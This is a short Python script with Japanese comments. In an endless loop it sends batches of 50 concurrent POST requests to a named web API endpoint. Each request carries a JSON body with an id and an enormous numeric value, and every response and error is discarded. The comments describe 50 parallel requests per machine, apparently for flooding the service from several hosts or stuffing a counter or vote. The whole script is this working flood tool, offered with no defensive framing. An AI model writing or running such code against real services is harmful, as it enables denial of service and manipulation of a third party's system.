import asyncio, aiohttp

URL = 'https://api-ryukogo2026.shibadogcap.com/v'
BODY = b'{"i":2974,"a":1000000000000000}'
HDR = {'Content-Type': 'application/json'}

async def main():
    sem = asyncio.Semaphore(50) # 1台あたり50並列
    async with aiohttp.ClientSession() as s:
        async def one():
            async with sem:
                try:
                    async with s.post(URL, data=BODY, headers=HDR, timeout=10) as r:
                        pass
                except: pass
        while True:
            # 50発を一斉に送る
            await asyncio.gather(*[one() for _ in range(50)])

asyncio.run(main())